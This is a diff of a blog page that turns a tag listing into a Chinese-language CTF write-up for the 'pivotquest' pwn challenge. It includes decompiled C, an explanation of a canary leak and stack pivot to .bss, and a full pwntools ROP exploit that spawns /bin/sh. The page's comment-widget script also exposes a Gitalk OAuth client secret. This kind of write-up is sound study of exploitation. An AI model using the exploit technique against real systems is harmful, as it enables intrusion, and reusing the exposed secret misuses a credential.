@@ -13,20 +13,24 @@
     
     <!--- Seo Part-->
     
-    <link rel="canonical" href="https://kazma.tw/tags/education/"/>
+    <link rel="canonical" href="https://kazma.tw/2024/11/11/pwn-ctf-pivotquest-writeup/"/>
     <meta name="robots" content="index,follow">
     <meta name="googlebot" content="index,follow">
     <meta name="revisit-after" content="1 days">
     
-        <meta name="description" content="kazma&#39;s personal space to dive deep into programming, cybersecurity challenges, CTF experiences, and insights from NCKU. Join me on my journey through the digital realm.">
-<meta property="og:type" content="website">
-<meta property="og:title" content="kazma&#39;s blog">
-<meta property="og:url" content="https://kazma.tw/tags/education/index.html">
+        <meta name="description" content="Exploitation先看一下這題的主邏輯： 123456789101112131415161718192021222324252627282930313233343536int __fastcall main(int argc, const char **argv, const char **envp)&amp;#123;  int edx; &#x2F;&#x2F; edx  int ecx; &#x2F;&#x2F; ecx  int">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Pwn CTF pivotquest Writeup">
+<meta property="og:url" content="https://kazma.tw/2024/11/11/Pwn-CTF-pivotquest-Writeup/index.html">
 <meta property="og:site_name" content="kazma&#39;s blog">
-<meta property="og:description" content="kazma&#39;s personal space to dive deep into programming, cybersecurity challenges, CTF experiences, and insights from NCKU. Join me on my journey through the digital realm.">
+<meta property="og:description" content="Exploitation先看一下這題的主邏輯： 123456789101112131415161718192021222324252627282930313233343536int __fastcall main(int argc, const char **argv, const char **envp)&amp;#123;  int edx; &#x2F;&#x2F; edx  int ecx; &#x2F;&#x2F; ecx  int">
 <meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2024-11-11T11:44:15.676Z">
+<meta property="article:modified_time" content="2024-11-11T11:55:57.000Z">
 <meta property="article:author" content="kazma">
-<meta property="article:tag" content="kazma, blog, ctf, reverse, engineering, pwn, binary, ncku, life, programming, coding, cybersecurity">
+<meta property="article:tag" content="writeup">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="migration">
 <meta name="twitter:card" content="summary">
     
     
@@ -39,7 +43,7 @@
     
     <title>
         
-            Tag: education -
+            Pwn CTF pivotquest Writeup -
         
         kazma&#39;s blog
     </title>
@@ -354,7 +358,7 @@
 
                             <li class="navbar-item">
                                 <!-- Menu -->
-                                <a class="active"
+                                <a class=""
                                    href="/tags"
                                         >
                                     <i class="fa-solid fa-tags fa-fw"></i>
@@ -486,7 +490,7 @@
 
                     <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                         
-                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                            href="/tags"
                         >
                             <span>
@@ -590,7 +594,7 @@
 
         <div class="statistics flex justify-around my-2.5">
     <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
-        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">64</div>
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">63</div>
         <div class="label text-third-text-color text-sm">Tags</div>
     </a>
     <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
@@ -598,7 +602,7 @@
         <div class="label text-third-text-color text-sm">Categories</div>
     </a>
     <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
-        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">108</div>
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">109</div>
         <div class="label text-third-text-color text-sm">Posts</div>
     </a>
 </div>
@@ -618,47 +622,260 @@
             <div class="main-content">
 
                 
-                    <div class="tag-container">
-	<div class="tag-name">
-		<i class="fa-solid fa-tag"></i>&nbsp;education
-	</div>
-	<div class="tag-post-list">
-		
-<div class="archive-list-container">
-    
-        <section class="archive-item mb-spacing-unit last:mb-0">
-            <div class="archive-item-header flex flex-row items-center mb-2">
-                <span class="archive-year font-semibold text-3xl mr-2">2024</span>
-                <span class="archive-year-post-count text-xs md:text-sm font-bold rounded-small bg-third-background-color py-[2px] px-[10px] border border-border-color">1</span>
-            </div>
+                    <div class="post-page-container flex relative justify-between box-border w-full h-full">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
             
-            <ul class="article-list pl-0 md:pl-8 text-lg leading-[1.5]">
+                <div class="w-full flex items-center pt-6 justify-start">
+                    <h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">Pwn CTF pivotquest Writeup</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/images/kazma.png">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">kazma</span>
+                        
+                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">成大資安社 創辦人/社長</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2024-11-11 19:44:15</span>
+        <span class="mobile">2024-11-11 19:44:15</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2024-11-11 19:55:57</span>
+            <span class="mobile">2024-11-11 19:55:57</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
                 
-                    
-                    
-                         <!-- Close the previous LI if not the first item -->
-                        <li class="article-item space-y-2 px-6 pt-10 pb-2 text-xl relative border-l-2 border-border-color" date-is='11-02'>
-                    
-                    <a href="/2024/11/02/%E9%A0%82%E5%A4%A7%E8%B3%87%E5%AE%89%E7%A0%94%E7%A9%B6%E6%89%80%E6%8E%A8%E7%94%84%E5%85%A8%E6%94%BB%E7%95%A5%EF%BC%9A%E6%BA%96%E5%82%99%E9%81%8E%E7%A8%8B%E3%80%81%E6%8A%80%E5%B7%A7%E5%88%86%E4%BA%AB%E8%88%87%E9%9D%A2%E8%A9%A6%E5%BF%83%E5%BE%97/" class="block overflow-hidden w-fit">
-                        <span class="article-title my-0.5 text-2xl">頂大資安研究所推甄全攻略：準備過程、技巧分享與面試心得</span>
-                    </a>
-                    
+                    <li>
+                        <a href="/tags/writeup/">writeup</a>&nbsp;
+                    </li>
                 
-                </li> <!-- Ensure the last item is properly closed -->
+                    <li>
+                        | <a href="/tags/pwn/">pwn</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/migration/">migration</a>&nbsp;
+                    </li>
+                
             </ul>
-        </section>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
     
 </div>
 
-	</div>
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><p>先看一下這題的主邏輯：</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> edx; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">int</span> ecx; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> r8; <span class="comment">// r8d</span></span><br><span class="line">  <span class="type">int</span> r9; <span class="comment">// r9d</span></span><br><span class="line">  <span class="type">int</span> edx2; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">int</span> ecx2; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> r82; <span class="comment">// r8d</span></span><br><span class="line">  <span class="type">int</span> r92; <span class="comment">// r9d</span></span><br><span class="line">  <span class="type">char</span> v12[<span class="number">4</span>]; <span class="comment">// [rsp+8h] [rbp-28h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v13; <span class="comment">// [rsp+Ch] [rbp-24h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">24</span>]; <span class="comment">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 canary; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  canary = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  v13 = fork();</span><br><span class="line">  <span class="keyword">if</span> ( v13 == <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    perror(<span class="string">&quot;fork error&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1LL</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !v13 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(&amp;unk_499018);</span><br><span class="line">    read(<span class="number">0LL</span>, buf, <span class="number">48LL</span>);</span><br><span class="line">    <span class="built_in">printf</span>((<span class="type">unsigned</span> <span class="type">int</span>)&amp;unk_499037, (<span class="type">unsigned</span> <span class="type">int</span>)buf, edx, ecx, r8, r9);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0LL</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  waitpid(v13, v12, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Kid&#x27;s missing... Again?&quot;</span>);</span><br><span class="line">  read(<span class="number">0LL</span>, buf, <span class="number">96LL</span>);</span><br><span class="line">  <span class="built_in">printf</span>((<span class="type">unsigned</span> <span class="type">int</span>)&amp;unk_499037, (<span class="type">unsigned</span> <span class="type">int</span>)buf, edx2, ecx2, r82, r92);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>有 canary 沒有 PIE，然後有兩個輸入點都可以 overflow，而且是 statically linked。<br>首先第一步是我們可以透過填滿 canary 前的空間讓他 printf 的時候一直印到 canary 的 null byte 為止，這樣我們就可以先取得 canary，然後再透過 migration 把 stack 搬到 bss 段，接著第二次輸入時就可以正常 rop 而且 &#x2F;bin&#x2F;sh 是在 bss 段了。</p>
+<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./pivotquest&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pivotquest&#x27;</span>)</span><br><span class="line"></span><br><span class="line">bss = elf.bss() + <span class="number">0x500</span></span><br><span class="line">main = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">pop_rax_ret = <span class="number">0x451037</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x401f9f</span></span><br><span class="line">pop_rsi_ret = <span class="number">0x409fce</span>    </span><br><span class="line">syscall = <span class="number">0x401d54</span></span><br><span class="line">read2 = <span class="number">0x4018b4</span> </span><br><span class="line">p.sendline(<span class="string">b&#x27;a&#x27;</span> * <span class="number">0x18</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;a\n&#x27;</span>)</span><br><span class="line">canary = u64(<span class="string">b&#x27;\x00&#x27;</span> + p.recv(<span class="number">7</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;?\n&#x27;</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span> * <span class="number">0x18</span> + p64(canary) + p64(bss) + p64(read2))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x10</span> + p64(canary) + p64(bss)</span><br><span class="line"></span><br><span class="line">payload += flat([pop_rdi_ret, bss - <span class="number">0x20</span>,</span><br><span class="line">                 pop_rsi_ret, <span class="number">0</span>,</span><br><span class="line">                 pop_rax_ret, <span class="number">59</span>,</span><br><span class="line">                 syscall])</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
+<h4 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned !!!"></a>Pwned !!!</h4>
+        </div>
+
+        
+            <div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> Pwn CTF pivotquest Writeup</li>
+        <li><strong>Author:</strong> kazma</li>
+        <li><strong>Created at
+                :</strong> 2024-11-11 19:44:15</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2024-11-11 19:55:57
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://kazma.tw/2024/11/11/Pwn-CTF-pivotquest-Writeup/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
 </div>
 
-<div class="tag-paginator">
-	<div class="paginator">
-    <span class="page-number current">1</span>
+            </div>
+        
+
+        
+            <ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+                
+                    <li class="tag-item mx-0.5">
+                        <a href="/tags/writeup/">#writeup</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item mx-0.5">
+                        <a href="/tags/pwn/">#pwn</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item mx-0.5">
+                        <a href="/tags/migration/">#migration</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
+
+        
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                    <div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="prev"
+                        rel="prev"
+                        href="/2024/11/15/HackTheBox-Machines-Scanned-Writeup/"
+                        >
+                            <span class="left arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">HackTheBox-Machines Scanned Writeup</span>
+                                <span class="post-nav-item">Prev posts</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/2024/11/11/Pwn-CTF-doors-Writeup/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">Pwn CTF doors Writeup</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+            <div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+                <div class="comments-container mt-10 w-full ">
+    <div id="comment-anchor" class="w-full h-2.5"></div>
+    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
+        Comments
+    </div>
+    
+
+        
+            
+    <div id="gitalk-container"></div>
+    <script data-swup-reload-script
+            src="//cdn.staticfile.org/gitalk/1.8.0/gitalk.min.js"></script>
+    <script data-swup-reload-script>
+
+        function loadGitalk() {
+            let __gitalk__pathname = decodeURI(location.pathname);
+            const __gitalk__pathnameLength = __gitalk__pathname.length;
+            const __gitalk__pathnameMaxLength = 50;
+            if (__gitalk__pathnameLength > __gitalk__pathnameMaxLength) {
+                __gitalk__pathname = __gitalk__pathname.substring(0, __gitalk__pathnameMaxLength - 3) + '...';
+            }
+
+            try {
+                Gitalk && new Gitalk({
+                    clientID: '68fd7e0e6c37358fbb4f',
+                    clientSecret: 'dc6a9d6490a92521e96b38717770845226846c62',
+                    repo: 'kazmatw.github.io',
+                    owner: 'kazmatw',
+                    admin: ['kazmatw'],
+                    id: __gitalk__pathname,
+                    language: 'en',
+                    proxy: 'https://github.com/login/oauth/access_token'
+                }).render('gitalk-container');
+
+            } catch (e) {
+                window.Gitalk = null;
+            }
+        }
+
+        if ('true') {
+            const loadGitalkTimeout = setTimeout(() => {
+                loadGitalk();
+                clearTimeout(loadGitalkTimeout);
+            }, 1000);
+        } else {
+            window.addEventListener('DOMContentLoaded', loadGitalk);
+        }
+    </script>
+
+
+
+        
+    
 </div>
 
+            </div>
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">Pwn CTF pivotquest Writeup</div>
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Exploitation"><span class="nav-text">Exploitation</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Exploit"><span class="nav-text">Exploit</span></a></li></ol>
+
+    </div>
 </div>
+        </div>
+    
+</div>
+
 
 
                 
@@ -684,7 +901,7 @@
                 
                 <p class="post-count space-x-0.5">
                     <span>
-                        108 posts in total
+                        109 posts in total
                     </span>
                     
                 </p>
@@ -741,6 +958,27 @@
         </div>
     </div>
 
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+            <li class="go-comment">
+                <i class="fa-regular fa-comments"></i>
+            </li>
+        
+    </ul>
+</div>
+
+        </div>
     
 
     <div class="right-side-tools-container">
